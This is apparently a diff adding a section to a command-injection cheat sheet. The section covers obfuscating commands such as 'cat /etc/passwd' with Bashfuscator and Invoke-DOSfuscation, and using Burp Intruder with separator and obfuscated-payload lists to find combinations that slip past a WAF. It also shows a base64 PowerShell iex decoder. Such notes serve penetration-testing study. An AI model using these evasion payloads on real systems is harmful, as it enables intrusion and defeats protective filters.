@@ -48,6 +48,18 @@ w'h'o'am'i  ;  who$@ami
 #   iex "$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<b64>')))"
 ```
 
+## Automated obfuscation & finding what gets through
+```bash
+./bashfuscator -c 'cat /etc/passwd'                      # Linux: auto-obfuscate a command
+./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1   # simpler, more reliable output
+# Windows (PowerShell): Invoke-DOSfuscation — Import-Module, SET COMMAND <cmd>, encoding
+```
+**Finding the working combo through a WAF (Burp Intruder, cluster bomb):** two payload positions —
+- Position 1 = separator list (`;`, `%0a`, `&`, `|`, `&&`, `||`, `` `` ``, `$()`) — **do NOT URL-encode**
+- Position 2 = obfuscated command list (`uname`, `u'n'a'm'e`, `$(rev<<<'emanu')`, `bash<<<$(base64 -d<<<...)`) — **URL-encode this one**
+
+The combos that don't return the WAF's block message (e.g. "Malicious request denied") are the ones that got through. Often a sub-shell separator like `%26$()` + a quote-obfuscated command is what lands.
+
 ## Approach & fix
 1. Find input reaching a command (filenames, ping/host fields, converters).
 2. Inject an operator + benign cmd (`id`/`whoami`) to confirm.
